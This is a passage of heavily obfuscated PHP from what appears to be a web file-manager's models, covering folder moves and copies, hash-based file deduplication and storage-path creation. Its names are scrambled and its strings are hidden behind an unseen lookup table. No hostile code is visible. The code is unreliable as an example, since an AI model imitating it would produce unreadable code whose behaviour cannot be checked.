$ïÁğÉı, $ÆÏ üîÙ, $èİşíÇ÷); $ö‹ò´«Ø = $this->_moveForce($˜¶—–, $çòŠĞşÍ, $ïÁğÉı); } else { if ($ÆÏ üîÙ == REPEAT_REPLACE) { $“¨¬ï·» = $this->sourceInfoCache($üÚ˜ì©ı); $Œ³‡ŒºØ = $this->fileHistory($“¨¬ï·», $ˆÜŒÊŸ¯[$³×Æˆá™[511]], $ˆÜŒÊŸ¯[$³×Æˆá™[78]]); $Ù±Úñ‹» = !0; if ($Œ³‡ŒºØ) { $ÜåÆÉ»Û[$³×Æˆá™[599]][] = $ˆÜŒÊŸ¯[$³×Æˆá™[511]]; } } } } } if ($Ù±Úñ‹» && !$ÜåÆÉ»Û[$³×Æˆá™[630]]) { $ÜåÆÉ»Û[$³×Æˆá™[630]] = !0; } return $ö‹ò´«Ø; } private function _moveForce($«Ğ…¸È, $Êë¾óòé, $íÏ‹€…²) { $­Öªó¹Ø =& $_SERVER[ ÇƒŠìÀ]; $øâÉÖ÷ó = $this->sourceInfo($«Ğ…¸È); $‘“¬Âù‰ = $this->sourceInfo($Êë¾óòé); $¼¥Ûİ” = $øâÉÖ÷ó[$­Öªó¹Ø[455]] == $­Öªó¹Ø[90]; $øÁÚ¶˜¥ = array($­Öªó¹Ø[447] => $‘“¬Âù‰[$­Öªó¹Ø[183]], $­Öªó¹Ø[622] => $‘“¬Âù‰[$­Öªó¹Ø[555]] . $‘“¬Âù‰[$­Öªó¹Ø[183]] . $­Öªó¹Ø[50], $­Öªó¹Ø[618] => $‘“¬Âù‰[$­Öªó¹Ø[180]], $­Öªó¹Ø[619] => $‘“¬Âù‰[$­Öªó¹Ø[540]], $­Öªó¹Ø[621] => USER_ID, $­Öªó¹Ø[464] => $íÏ‹€…²); $ìã×‚ê˜ = $øâÉÖ÷ó[$­Öªó¹Ø[180]] == SourceModel::TYPE_GROUP && $‘“¬Âù‰[$­Öªó¹Ø[180]] == SourceModel::TYPE_GROUP && $øâÉÖ÷ó[$­Öªó¹Ø[540]] == $‘“¬Âù‰[$­Öªó¹Ø[540]]; if (!$ìã×‚ê˜ && $this->moveClearAuth) { Model($­Öªó¹Ø[538])->authClear($«Ğ…¸È); } $–éƒ´ô = $øâÉÖ÷ó[$­Öªó¹Ø[475]] == $­Öªó¹Ø[90] && $‘“¬Âù‰[$­Öªó¹Ø[475]] != $­Öªó¹Ø[90]; if ($–éƒ´ô) { $øÁÚ¶˜¥[$­Öªó¹Ø[474]] = 0; } if ($¼¥Ûİ”) { $ç“öŸğƒ = array($­Öªó¹Ø[622] => array($­Öªó¹Ø[582], $øâÉÖ÷ó[$­Öªó¹Ø[555]] . $øâÉÖ÷ó[$­Öªó¹Ø[183]] . $­Öªó¹Ø[583])); $÷‹ÀÃ¦ = $øâÉÖ÷ó[$­Öªó¹Ø[555]] . $øâÉÖ÷ó[$­Öªó¹Ø[183]] . $­Öªó¹Ø[50]; $éˆ†×à¹ = $‘“¬Âù‰[$­Öªó¹Ø[555]] . $‘“¬Âù‰[$­Öªó¹Ø[183]] . $­Öªó¹Ø[50] . $øâÉÖ÷ó[$­Öªó¹Ø[183]] . $­Öªó¹Ø[50]; $ÙÇŸÍÑ“ = array($­Öªó¹Ø[622] => array($­Öªó¹Ø[631], "\162\145\160\x6c\141\143\145\50\x70\141\162\x65\156\x74\x4c\145\x76\x65\x6c\54\x27{$÷‹ÀÃ¦}\x27\54\x27{$éˆ†×à¹}\47\x29"), $­Öªó¹Ø[618] => $‘“¬Âù‰[$­Öªó¹Ø[180]], $­Öªó¹Ø[619] => $‘“¬Âù‰[$­Öªó¹Ø[540]]); if ($–éƒ´ô) { $ÙÇŸÍÑ“[$­Öªó¹Ø[474]] = 0; } $this->where($ç“öŸğƒ)->data($ÙÇŸÍÑ“)->save(); } $this->where(array($­Öªó¹Ø[461] => $«Ğ…¸È))->data($øÁÚ¶˜¥)->save(); return $«Ğ…¸È; } private function clearShare($ÙïĞ«Í«, $Î²ã²½) { $ğ‰áš²× =& $_SERVER[ ÇƒŠìÀ]; $Öàˆ¯¡² = $this->sourceInfo($ÙïĞ«Í«); $˜¤àˆ´Ç = $this->sourceInfo($Î²ã²½); if ($Öàˆ¯¡²[$ğ‰áš²×[540]] == $˜¤àˆ´Ç[$ğ‰áš²×[540]] && $Öàˆ¯¡²[$ğ‰áš²×[180]] == $ğ‰áš²×[632]) { return; } $ÖšÆÄî = array($ğ‰áš²×[555] => array($ğ‰áš²×[582], $Öàˆ¯¡²[$ğ‰áš²×[555]] . $ÙïĞ«Í« . $ğ‰áš²×[583])); $ƒ†‚›Ş = $this->field($ğ‰áš²×[461])->where($ÖšÆÄî)->getField($ğ‰áš²×[183], !0); if (!$ƒ†‚›Ş) { return; } $ÖšÆÄî = array($ğ‰áš²×[183] => array($ğ‰áš²×[7], $ƒ†‚›Ş), $ğ‰áš²×[633] => 1); $©ºßƒç· = Model($ğ‰áš²×[634])->field($ğ‰áš²×[635])->where($ÖšÆÄî)->select(); if (!$©ºßƒç·) { return; } $©ºßƒç· = array_to_keyvalue($©ºßƒç·, $ğ‰áš²×[12], $ğ‰áš²×[635]); $ÖšÆÄî = array($ğ‰áš²×[635] => array($ğ‰áš²×[7], $©ºßƒç·)); Model($ğ‰áš²×[634])->where($ÖšÆÄî)->save(array($ğ‰áš²×[633] => 0)); Model($ğ‰áš²×[636])->where($ÖšÆÄî)->delete(); } public function copyFolderFromIO($ˆÇ¨£É”, $µ¾ÉÂ÷˜, $€ªÜòˆ, $­Šû´ÚÇ, $íáìóá, $¤è¥ˆÈî = false) { $âÎâóî’ =& $_SERVER[ ÇƒŠìÀ]; $ú½Àï”ƒ = array($âÎâóî’[600] => array(), $âÎâóî’[601] => array(), $âÎâóî’[599] => array(), $âÎâóî’[637] => array()); $â”±ñ¹˜ = $¤è¥ˆÈî ? $¤è¥ˆÈî : $ˆÇ¨£É”->pathThis($µ¾ÉÂ÷˜); $÷–Ìºœü = $this->fileNameExist($€ªÜòˆ, $â”±ñ¹˜); $÷›ÀÛ»à = $this->mkdir($€ªÜòˆ, $â”±ñ¹˜, $­Šû´ÚÇ); if (!$÷–Ìºœü || $­Šû´ÚÇ == REPEAT_RENAME_FOLDER) { $­Šû´ÚÇ = !1; } if ($÷–Ìºœü) { $this->_childrenAllMake($÷–Ìºœü); } Hook::trigger($âÎâóî’[638]); $this->_copyChildTo($ˆÇ¨£É”, $µ¾ÉÂ÷˜, $÷›ÀÛ»à, $­Šû´ÚÇ, $ú½Àï”ƒ, $íáìóá); Hook::trigger($âÎâóî’[639]); if ($÷›ÀÛ»à) { $this->folderSizeResetChildren($÷›ÀÛ»à); } $this->_childrenListClear(); Model($âÎâóî’[602])->addAll($ú½Àï”ƒ[$âÎâóî’[600]], array(), !0); Model($âÎâóî’[603])->eventCopy($÷›ÀÛ»à); $this->saveAll($ú½Àï”ƒ[$âÎâóî’[601]]); Model($âÎâóî’[514])->linkAdd($ú½Àï”ƒ[$âÎâóî’[599]]); Model($âÎâóî’[514])->remove($ú½Àï”ƒ[$âÎâóî’[637]]); $this->folderSizeReset($€ªÜòˆ); $this->updateModifyTime($€ªÜòˆ); return $÷›ÀÛ»à; } private function _copyChildTo($›ƒõ«Øá, $„Û©ë‡, $Ü ÇÕíá, $Ì§»Äå®, &$ŸµˆŠ©­, $Í¿íûß©) { $…ƒé€ø‘ =& $_SERVER[ ÇƒŠìÀ]; $ÓÅçÊ¶Ö = $this->sourceInfoCache($Ü ÇÕíá); $€Ç£Ê¯› = $›ƒõ«Øá->listPath($„Û©ë‡); $€Ç£Ê¯› = $€Ç£Ê¯› ? $€Ç£Ê¯› : array($…ƒé€ø‘[85] => array(), $…ƒé€ø‘[84] => array()); $ÖŠ¿±³– = array_merge($€Ç£Ê¯›[$…ƒé€ø‘[85]], $€Ç£Ê¯›[$…ƒé€ø‘[84]]); $åÓ‚âÊÑ = $this->_addFiles($›ƒõ«Øá, $€Ç£Ê¯›[$…ƒé€ø‘[85]], $Í¿íûß©); $ğ¶ó¿†˜ = array(); foreach ($ÖŠ¿±³– as &$ÁÃˆø¡«) { if (isset($åÓ‚âÊÑ[$ÁÃˆø¡«[$…ƒé€ø‘[32]]])) { $ÁÃˆø¡« = $åÓ‚âÊÑ[$ÁÃˆø¡«[$…ƒé€ø‘[32]]]; } $ÁÃˆø¡«[$…ƒé€ø‘[455]] = $ÁÃˆø¡«[$…ƒé€ø‘[33]] == $…ƒé€ø‘[77]; $ÁÃˆø¡«[$…ƒé€ø‘[456]] = substr(_get($ÁÃˆø¡«, $…ƒé€ø‘[177], $…ƒé€ø‘[12]), 0, 10); $ÁÃˆø¡«[$…ƒé€ø‘[78]] = _get($ÁÃˆø¡«, $…ƒé€ø‘[78], 0); $ÁÃˆø¡«[$…ƒé€ø‘[511]] = _get($ÁÃˆø¡«, $…ƒé€ø‘[511], 0); if (!isset($ÁÃˆø¡«[$…ƒé€ø‘[640]]) && $ÁÃˆø¡«[$…ƒé€ø‘[511]]) { $ŸµˆŠ©­[$…ƒé€ø‘[637]][] = $ÁÃˆø¡«[$…ƒé€ø‘[511]]; } if ($Ì§»Äå®) { $Êƒ¶‡© = $this->fileNameExistCache($Ü ÇÕíá, $ÁÃˆø¡«[$…ƒé€ø‘[32]]); if ($Êƒ¶‡©) { if ($ÁÃˆø¡«[$…ƒé€ø‘[455]] || $Ì§»Äå® == REPEAT_SKIP) { continue; } if ($Ì§»Äå® == REPEAT_REPLACE) { $ëìò…ç = $this->sourceInfoCache($Êƒ¶‡©); $¸ªû˜ï = $this->fileHistory($ëìò…ç, $ÁÃˆø¡«[$…ƒé€ø‘[511]], $ÁÃˆø¡«[$…ƒé€ø‘[78]]); if ($¸ªû˜ï) { $ŸµˆŠ©­[$…ƒé€ø‘[599]][] = $ÁÃˆø¡«[$…ƒé€ø‘[511]]; } continue; } else { if ($Ì§»Äå® == REPEAT_RENAME) { $ÁÃˆø¡«[$…ƒé€ø‘[32]] = $this->fileNameAutoCache($Ü ÇÕíá, $ÁÃˆø¡«[$…ƒé€ø‘[32]], $Ì§»Äå®, !1); } } } } if (!$ÁÃˆø¡«[$…ƒé€ø‘[455]] && $ÁÃˆø¡«[$…ƒé€ø‘[511]] == 0) { continue; } if (!$ÁÃˆø¡«[$…ƒé€ø‘[455]] && $ÁÃˆø¡«[$…ƒé€ø‘[511]]) { $ŸµˆŠ©­[$…ƒé€ø‘[599]][] = $ÁÃˆø¡«[$…ƒé€ø‘[511]]; } $ğ¶ó¿†˜[] = $this->_makeItemData($ÁÃˆø¡«, $ÓÅçÊ¶Ö, $ÁÃˆø¡«[$…ƒé€ø‘[32]]); } unset($ÁÃˆø¡«); if (!empty($ğ¶ó¿†˜)) { $this->addAll($ğ¶ó¿†˜); $this->_childrenListSelect($Ü ÇÕíá); } $æşİÙ»¨ = $this->_childrenList($Ü ÇÕíá); $æşİÙ»¨ = array_to_keyvalue($æşİÙ»¨, $…ƒé€ø‘[32]); foreach ($ÖŠ¿±³– as $ÁÃˆø¡«) { $ëìò…ç = $æşİÙ»¨[$ÁÃˆø¡«[$…ƒé€ø‘[32]]]; $Í¼ù„ßæ = $ëìò…ç[$…ƒé€ø‘[183]]; $this->_copyApplyMeta($ëìò…ç, $ŸµˆŠ©­); if ($ÁÃˆø¡«[$…ƒé€ø‘[33]] == $…ƒé€ø‘[77]) { $ÁÃˆø¡«[$…ƒé€ø‘[86]] = $›ƒõ«Øá->getPathInner($ÁÃˆø¡«[$…ƒé€ø‘[86]]); $this->_copyChildTo($›ƒõ«Øá, $ÁÃˆø¡«[$…ƒé€ø‘[86]], $Í¼ù„ßæ, $Ì§»Äå®, $ŸµˆŠ©­, $Í¿íûß©); } } } private function _addFiles($¡‘ßª™´, $ùİŒŒ’ş, $‹Àë¦Å) { $½â‚¥İ— =& $_SERVER[ ÇƒŠìÀ]; if (!$ùİŒŒ’ş || count($ùİŒŒ’ş) == 0) { return array(); } $İÂÑÈ£¬ = array(); foreach ($ùİŒŒ’ş as &$ÄÙ½Ø—) { Hook::trigger($½â‚¥İ—[641], $ÄÙ½Ø—); $ÄÙ½Ø—[$½â‚¥İ—[86]] = $¡‘ßª™´->getPathInner($ÄÙ½Ø—[$½â‚¥İ—[86]]); $úÊ·©Õ‚ = $¡‘ßª™´->hashSimple($ÄÙ½Ø—[$½â‚¥İ—[86]]); $Ä‡½˜ÂÃ = $¡‘ßª™´->hashMd5($ÄÙ½Ø—[$½â‚¥İ—[86]]); if (strlen($Ä‡½˜ÂÃ) > 10 && !isset($İÂÑÈ£¬[$Ä‡½˜ÂÃ])) { $İÂÑÈ£¬[$Ä‡½˜ÂÃ] = array(); } $ÄÙ½Ø—[$½â‚¥İ—[642]] = $úÊ·©Õ‚; $ÄÙ½Ø—[$½â‚¥İ—[517]] = $Ä‡½˜ÂÃ; $İÂÑÈ£¬[$Ä‡½˜ÂÃ][] =& $ÄÙ½Ø—; if (count($İÂÑÈ£¬[$Ä‡½˜ÂÃ]) > 1) { $ÄÙ½Ø—[$½â‚¥İ—[640]] = !0; } Hook::trigger($½â‚¥İ—[643], $ÄÙ½Ø—); } unset($ÄÙ½Ø—); $íÒÃ»úÍ = array($½â‚¥İ—[517] => array($½â‚¥İ—[7], array_keys($İÂÑÈ£¬))); $Ô‹ñú¹³ = Model($½â‚¥İ—[644]); $¥¥³‘½² = $Ô‹ñú¹³->where($íÒÃ»úÍ)->select(); $¥¥³‘½² = $¥¥³‘½² ? $¥¥³‘½² : array(); foreach ($¥¥³‘½² as $æ¥û¨—§) { if (!isset($İÂÑÈ£¬[$æ¥û¨—§[$½â‚¥İ—[517]]])) { continue; } $ÇŸŠÜç© = $İÂÑÈ£¬[$æ¥û¨—§[$½â‚¥İ—[517]]]; foreach ($ÇŸŠÜç© as &$ÄÙ½Ø—) { $ÄÙ½Ø—[$½â‚¥İ—[511]] = $æ¥û¨—§[$½â‚¥İ—[511]]; $ÄÙ½Ø—[$½â‚¥İ—[640]] = !0; } unset($ÄÙ½Ø—); } $Ÿ¯¤Î½ = array(); foreach ($ùİŒŒ’ş as $èöË—Ÿû) { Hook::trigger($½â‚¥İ—[645], $èöË—Ÿû); if (isset($èöË—Ÿû[$½â‚¥İ—[640]]) && $èöË—Ÿû[$½â‚¥İ—[640]]) { Hook::trigger($½â‚¥İ—[646], $èöË—Ÿû); continue; } $ ı»áÑø = $¡‘ßª™´->getPathInner($èöË—Ÿû[$½â‚¥İ—[86]]); $»›ò›Â› = $Ô‹ñú¹³->addFileMake($ ı»áÑø, $èöË—Ÿû[$½â‚¥İ—[78]], $èöË—Ÿû[$½â‚¥İ—[642]], $èöË—Ÿû[$½â‚¥İ—[517]], $èöË—Ÿû[$½â‚¥İ—[32]], $‹Àë¦Å); Hook::trigger($½â‚¥İ—[646], $èöË—Ÿû); if (!is_array($»›ò›Â›)) { continue; } $Ÿ¯¤Î½[] = $»›ò›Â›; } $Ô‹ñú¹³->addAll($Ÿ¯¤Î½); $íÒÃ»úÍ = array($½â‚¥İ—[517] => array($½â‚¥İ—[7], array_keys($İÂÑÈ£¬))); $¥¥³‘½² = $Ô‹ñú¹³->where($íÒÃ»úÍ)->select(); $¥¥³‘½² = $¥¥³‘½² ? $¥¥³‘½² : array(); foreach ($¥¥³‘½² as $æ¥û¨—§) { if (!isset($İÂÑÈ£¬[$æ¥û¨—§[$½â‚¥İ—[517]]])) { continue; } $ëÂ‡ê€ô =& $İÂÑÈ£¬[$æ¥û¨—§[$½â‚¥İ—[517]]]; foreach ($ëÂ‡ê€ô as &$ÄÙ½Ø—) { $ÄÙ½Ø—[$½â‚¥İ—[511]] = $æ¥û¨—§[$½â‚¥İ—[511]]; } unset($ÄÙ½Ø—); } $ˆòİüè = array(); foreach ($ùİŒŒ’ş as $¶¶‰Ø£Ñ) { $ˆòİüè[$¶¶‰Ø£Ñ[$½â‚¥İ—[32]]] = $¶¶‰Ø£Ñ; } return $ˆòİüè; } } goto AƒÜÒÖ©ç›; d„ãˆ‹Î¡á: class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\x6c\x65"; protected $tableMeta = array("\164\x61\x62\154\145\116\141\x6d\145" => "\151\157\137\146\x69\x6c\x65\x5f\x6d\145\x74\141", "\x6d\x65\x74\141\106\x69\x65\x6c\x64" => "\x66\x69\x6c\145\111\x44"); public function fileInfo($åí‹•¤ñ) { $ÈÎâæ×ë =& $_SERVER[ ÇƒŠìÀ]; static $‚âÀ°ôº = array(); if (!isset($‚âÀ°ôº[$åí‹•¤ñ])) { $²ô£¤İ = $ÈÎâæ×ë[1936]; $®óÒµ‹Ï = Model($ÈÎâæ×ë[514])->field($²ô£¤İ)->where(array($ÈÎâæ×ë[512] => $åí‹•¤ñ))->find(); $‚âÀ°ôº[$åí‹•¤ñ] = $®óÒµ‹Ï; } return $‚âÀ°ôº[$åí‹•¤ñ]; } public function addFileByContent($Œ‰íš¾ô = '', $¾îíİŸ– = '') { $»ğÑ±Š =& $_SERVER[ ÇƒŠìÀ]; $ù”Ö‰¥ù = TEMP_PATH . $»ğÑ±Š[1937]; if (!is_dir($ù”Ö‰¥ù)) { mk_dir($ù”Ö‰¥ù); } $×ßûÃá÷ = $ù”Ö‰¥ù . $»ğÑ±Š[1938] . rand_string(16); file_put_contents($×ßûÃá÷, $Œ‰íš¾ô); $Êáàû¹ö = $this->addFile($×ßûÃá÷, $¾îíİŸ–, !0); if (file_exists($×ßûÃá÷)) { @unlink($×ßûÃá÷); } return $Êáàû¹ö; } public function createFileName($îÚ¥”…Ğ, $ÊÒ•‘Â = false, $ôŞÍÀ©˜ = false) { $¿ûÁÔ‚© =& $_SERVER[ ÇƒŠìÀ]; $§­Ø´Ê = IO::init($¿ûÁÔ‚©[8]); $›øØ’Í = $this->makeFilePath($îÚ¥”…Ğ, $§­Ø´Ê, $ÊÒ•‘Â, $ôŞÍÀ©˜); $î†¿ä¡ = $§­Ø´Ê->pathFather($›øØ’Í); static $†øµ©Şœ = false; $ÈÀ‚¸»É = $¿ûÁÔ‚©[1939] . md5($î†¿ä¡); if (!$†øµ©Şœ && !Cache::get($ÈÀ‚¸»É)) { $†øµ©Şœ = !0; $½ «ü = IO::mkdir($î†¿ä¡); if (!IO::exist($½ «ü . $¿ûÁÔ‚©[826])) { IO::mkfile($½ «ü . $¿ûÁÔ‚©[826]); } Cache::set($ÈÀ‚¸»É, 1, 3600 * 2); } return $›øØ’Í; } public function makeFilePath($ãÀÈÙıï, $òöŒ©—Â, $šŸŠë€© = false, $şéç½à = false) { $ŞŸû˜–‰ =& $_SERVER[ ÇƒŠìÀ]; $î–„ = Model($ŞŸû˜–‰[799])->get($ŞŸû˜–‰[1940]); $§ùøöà¤ = KodIO::defaultIO() . date($ŞŸû˜–‰[1941]); $ïÇºîĞş = $§ùøöà¤ . rand_string(5) . short_id(100); $ãÀÈÙıï = str_replace($ŞŸû˜–‰[8], $ŞŸû˜–‰[11], KodIO::clear($ãÀÈÙıï)); $ìêúüïŸ = $òöŒ©—Â->ext($ãÀÈÙıï); if (!$ãÀÈÙıï) { $î–„ = $ŞŸû˜–‰[1942]; } switch ($î–„) { case $ŞŸû˜–‰[1943]: $ïÇºîĞş = $ïÇºîĞş . $ŞŸû˜–‰[10] . $òöŒ©—Â->ext($ãÀÈÙıï); if ($ìêúüïŸ == $ŞŸû˜–‰[1880]) { $ïÇºîĞş .= $ŞŸû˜–‰[1241]; } break; case $ŞŸû˜–‰[1944]: $–‡Î¤ = Model($ŞŸû˜–‰[799])->get($ŞŸû˜–‰[800]); $´ÀÈ©û’ = substr(md5($ŞŸû˜–‰[801] . $–‡Î¤ . date($ŞŸû˜–‰[777])), 0, 8); $ğœˆ¢†¡ = KodIO::defaultDriver(); $§ùøöà¤ = $ŞŸû˜–‰[1272] . $ğœˆ¢†¡[$ŞŸû˜–‰[445]] . $ŞŸû˜–‰[454] . date($ŞŸû˜–‰[1945]) . $´ÀÈ©û’ . $ŞŸû˜–‰[8]; if ($ìêúüïŸ == $ŞŸû˜–‰[1880]) { $ãÀÈÙıï .= $ŞŸû˜–‰[1241]; } $»ßíşÎÉ = $ŞŸû˜–‰[1946] . $§ùøöà¤ . $ãÀÈÙıï; CacheLock::lock($»ßíşÎÉ); $ïÇºîĞş = $§ùøöà¤ . $ãÀÈÙıï; if (IO::exist($§ùøöà¤ . $ãÀÈÙıï)) { $¤ÊÉ¹çª = substr($ãÀÈÙıï, 0, strlen($ãÀÈÙıï) - strlen($ìêúüïŸ)); $Ğµª”Óõ = $şéç½à ? substr($şéç½à, 0, 5) : ($šŸŠë€© ? substr($šŸŠë€©, 0, 5) : rand_string(5)); $ïÇºîĞş = $§ùøöà¤ . $¤ÊÉ¹çª . $Ğµª”Óõ . $ŞŸû˜–‰[10] . $ìêúüïŸ; } if (IO::isTypeObject($ïÇºîĞş) && !IO::isUploadServer($ïÇºîĞş)) { if (IO::exist($ïÇºîĞş)) { return $ïÇºîĞş; } $¬Æ’¾½û = IO::setContent($ïÇºîĞş, $ŞŸû˜–‰[12]); if (!$¬Æ’¾½û) { show_json($ŞŸû˜–‰[1947], !1); } } CacheLock::unlock($»ßíşÎÉ); break; case $ŞŸû˜–‰[1942]: break; default: break; } return $ïÇºîĞş; } public function addFileByRemote($©î•…Òø, $ş¯ê±óÇ, $º±¿•Üú = array()) { $ÖÉÉÛ¸¶ =& $_SERVER[ ÇƒŠìÀ]; if (!IO::exist($©î•…Òø)) { return !1; } $·‰¶ª·‰ = $º±¿•Üú[$ÖÉÉÛ¸¶[517]] ? $º±¿•Üú[$ÖÉÉÛ¸¶[517]] : $ÖÉÉÛ¸¶[12]; $Ğô¶ƒ = IO::hashMd5($©î•…Òø, $·‰¶ª·‰); $•ÚËÜÄ = KodIO::defaultDriver(); $ğ…Ìúó¤ = array($ÖÉÉÛ¸¶[587] => IO::size($©î•…Òø), $ÖÉÉÛ¸¶[1948] => 1, $ÖÉÉÛ¸¶[464] => $ş¯ê±óÇ, $ÖÉÉÛ¸¶[837] => $•ÚËÜÄ[$ÖÉÉÛ¸¶[445]], $ÖÉÉÛ¸¶[465] => $©î•…Òø, $ÖÉÉÛ¸¶[1949] => $º±¿•Üú[$ÖÉÉÛ¸¶[642]] ? $º±¿•Üú[$ÖÉÉÛ¸¶[642]] : IO::hashSimple($©î•…Òø), $ÖÉÉÛ¸¶[1950] => $Ğô¶ƒ ? $Ğô¶ƒ : $·‰¶ª·‰); if ($İ±›é¡· = $this->addFileCheckExist($ğ…Ìúó¤[$ÖÉÉÛ¸¶[642]], $ğ…Ìúó¤[$ÖÉÉÛ¸¶[517]], $ğ…Ìúó¤[$ÖÉÉÛ¸¶[78]])) { return $İ±›é¡·; } return $this->addFileData($ğ…Ìúó¤); } private function addFileData($§´¢Àé) { $ü¯ÑŞÁ =& $_SERVER[ ÇƒŠìÀ]; if (!$§´¢Àé) { return !1; } $§´¢Àé[$ü¯ÑŞÁ[78]] = intval($§´¢Àé[$ü¯ÑŞÁ[78]]); if (!$§´¢Àé[$ü¯ÑŞÁ[78]] && strlen($§´¢Àé[$ü¯ÑŞÁ[642]]) > 32) { $§´¢Àé[$ü¯ÑŞÁ[78]] = intval(substr($§´¢Àé[$ü¯ÑŞÁ[642]], 32)); } $¢¾Í´Ú = $this->add($§´¢Àé); return $this->find($¢¾Í´Ú); } public function addFile($äÚ îÉÓ, $…ÃÙŞ§ğ, $ÇÜƒ‚ì“ = false) { $é¢¦¦•° =& $_SERVER[ ÇƒŠìÀ]; $İ˜»²ª = IO::hashSimple($äÚ îÉÓ); $½ô Öæ = IO::size($äÚ îÉÓ); $–•÷Ê«É = $½ô Öæ <= 1024 * 1024 * 10 ? IO::hashMd5($äÚ îÉÓ) : $é¢¦¦•°[12]; $à¼©Ô÷œ = $é¢¦¦•°[1951] . $İ˜»²ª; CacheLock::lock($à¼©Ô÷œ); if ($–•÷Ê«É && $İ˜»²ª) { $¾Œ¤–£ = $this->addFileCheckExist($İ˜»²ª, $–•÷Ê«É, $½ô Öæ); if ($¾Œ¤–£) { CacheLock::unlock($à¼©Ô÷œ); return $¾Œ¤–£; } } $å¸—›÷© = $this->addFileMake($äÚ îÉÓ, $½ô Öæ, $İ˜»²ª, $–•÷Ê«É, $…ÃÙŞ§ğ, $ÇÜƒ‚ì“); $®ÏÍ—É‘ = $this->addFileData($å¸—›÷©); CacheLock::unlock($à¼©Ô÷œ); if (!$–•÷Ê«É && $®ÏÍ—É‘) { $this->fileMd5Check($®ÏÍ—É‘); } return $®ÏÍ—É‘; } public function fileMd5Check($Úñˆç¥Ú) { $Ë‰¢šÎ  =& $_SERVER[ ÇƒŠìÀ]; $ï½âÄé“ = array($Úñˆç¥Ú[$Ë‰¢šÎ [511]], $Úñˆç¥Ú[$Ë‰¢šÎ [86]]); $ğÆÕÏéù = $Ë‰¢šÎ [1952] . $Úñˆç¥Ú[$Ë‰¢šÎ [86]]; $ªá‡‡ = $Ë‰¢šÎ [1953] . $Úñˆç¥Ú[$Ë‰¢šÎ [511]]; TaskQueue::add($Ë‰¢šÎ [1954], $ï½âÄé“, $ğÆÕÏéù, $ªá‡‡); } public function fileMd5Set($¼¸ âÀÙ, $²òÌ•ªõ) { $²š ú¡ =& $_SERVER[ ÇƒŠìÀ]; $á”ôˆé = $this->find($¼¸ âÀÙ); if (!$á”ôˆé || $á”ôˆé[$²š ú¡[517]]) { return; } $ò±ÈıÓÊ = IO::hashMd5($²òÌ•ªõ); if (!$ò±ÈıÓÊ) { return $²š ú¡[12]; } $this->where(array($²š ú¡[511] => $¼¸ âÀÙ))->save(array($²š ú¡[517] => $ò±ÈıÓÊ)); } public function addFileMake($·ˆáœä, $ŞŸäÜŞı, $¤…üä§½, $ê÷ŸØ¾, $ı½ëÌ‰ú, $­Å´Èúú) { $Ã¸šø½ê =& $_SERVER[ ÇƒŠìÀ]; $³Šë—ø = $this->createFileName($ı½ëÌ‰ú, $¤…üä§½, $ê÷ŸØ¾); $¥õ¢ú“ı = get_path_father($³Šë—ø); $ş ŒäßÒ = get_path_this($³Šë—ø); if ($­Å´Èúú) { $‡Ûàşİá = IO::move($·ˆáœä, $¥õ¢ú“ı, !1, $ş ŒäßÒ); } else { $‡Ûàşİá = IO::copy($·ˆáœä, $¥õ¢ú“ı, !1, $ş ŒäßÒ); } if (!$‡Ûàşİá) { return !1; } $×Û´ş¢ = KodIO::defaultDriver(); $©åÖõÍ = array($Ã¸šø½ê[587] => $ŞŸäÜŞı, $Ã¸šø½ê[1948] => 1, $Ã¸šø½ê[464] => $ı½ëÌ‰ú, $Ã¸šø½ê[837] => $×Û´ş¢[$Ã¸šø½ê[445]], $Ã¸šø½ê[465] => $³Šë—ø, $Ã¸šø½ê[1949] => $¤…üä§½, $Ã¸šø½ê[1950] => $ê÷ŸØ¾); return $©åÖõÍ; } public function addFileCheckExist($§´êö¥È, $è®×† Ë, $¨æ³¶µÏ) { $Êí•Ò =& $_SERVER[ ÇƒŠìÀ]; $˜æ®®¥— = $this->findByHash($§´êö¥È, $è®×† Ë); if (!$˜æ®®¥—) { return !1; } $¸·ÊÀä’ = array($Êí•Ò[1948] => intval($˜æ®®¥—[$Êí•Ò[1955]]) + 1, $Êí•Ò[587] => $¨æ³¶µÏ); $this->where(array($Êí•Ò[512] => $˜æ®®¥—[$Êí•Ò[511]]))->save($¸·ÊÀä’); return $˜æ®®¥—; } public function remove($À×§¢œë) { $this->linkCountChange($À×§¢œë, !1); $this->clearEmpty(); return !0; } public function linkAdd($¼ŞıÈ¢í) { $this->linkCountChange($¼ŞıÈ¢í, !0); } public function linkCountChange($ëÑÂÓÌ, $Ó¦Ì”òø) { $‡±Í =& $_SERVER[ ÇƒŠìÀ]; if (!$ëÑÂÓÌ) { return; } if (!is_array($ëÑÂÓÌ)) { $ëÑÂÓÌ = array($ëÑÂÓÌ); } $¿¬íó = array(); foreach ($ëÑÂÓÌ as $„ˆôäº) { $æÊƒ£óÊ = $„ˆôäº . $‡±Í[12]; if (!$¿¬íó[$æÊƒ£óÊ]) { $¿¬íó[$æÊƒ£óÊ] = 0; } $¿¬íó[$æÊƒ£óÊ]++; } $¨Á¤“ÒÅ = array(); foreach ($¿¬íó as $„ˆôäº => $²ÕóÏÅ¦) { $æÊƒ£óÊ = $²ÕóÏÅ¦ . $‡±Í[12]; if (!$¨Á¤“ÒÅ[$æÊƒ£óÊ]) { $¨Á¤“ÒÅ[$æÊƒ£óÊ] = array(); } $¨Á¤“ÒÅ[$æÊƒ£óÊ][] = $„ˆôäº; } foreach ($¨Á¤“ÒÅ as $²ÕóÏÅ¦ => $ »®í«Ü) { if (!$ »®í«Ü) { continue; } $²ÕóÏÅ¦ = $Ó¦Ì”òø ? $²ÕóÏÅ¦ : -intval($²ÕóÏÅ¦); $¯§Çôş = array($‡±Í[511] => array($‡±Í[7], $ »®í«Ü)); if ($²ÕóÏÅ¦ < 0) { $¯§Çôş[$‡±Í[1955]] = array($‡±Í[1050], abs($²ÕóÏÅ¦)); } $this->where($¯§Çôş)->setAdd($‡±Í[1955], $²ÕóÏÅ¦); } } public function findByHash($è€îè¢Ï, $öÍ¼“×ó = false) { $×Í¹¾… =& $_SERVER[ ÇƒŠìÀ]; if (!$è€îè¢Ï && !$öÍ¼“×ó) { return !1; } $ÅïÖ«› = array($×Í¹¾…[1949] => $è€îè¢Ï); if ($öÍ¼“×ó) { $ÅïÖ«› = array($×Í¹¾…[1950] => $öÍ¼“×ó); } return $this->order($×Í¹¾…[1956])->where($ÅïÖ«›)->find(); } public function clearEmpty($‚Úìµ­Å = 0) { $¥…ñ·üÊ =& $_SERVER[ ÇƒŠìÀ]; $¾ßÓæìç = time() - 3600 * 24 * $‚Úìµ­Å; 